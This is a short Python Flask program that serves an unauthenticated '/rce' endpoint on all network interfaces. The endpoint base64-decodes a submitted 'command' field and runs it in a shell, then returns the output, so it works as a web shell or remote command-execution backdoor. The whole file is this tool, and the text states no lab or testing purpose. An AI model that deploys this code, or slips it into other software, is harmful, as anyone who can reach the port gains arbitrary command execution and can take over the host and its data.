from flask import Flask,request
import subprocess
import base64

app = Flask(__name__)

@app.route('/rce', methods=['POST'])
def handle_command():
	b64_input = request.form.get('command')
	command = base64.b64decode(b64_input)
	output = subprocess.check_output(command, shell=True)
	return output

if __name__ == '__main__':
	app.run(host='0.0.0.0', port=8000)
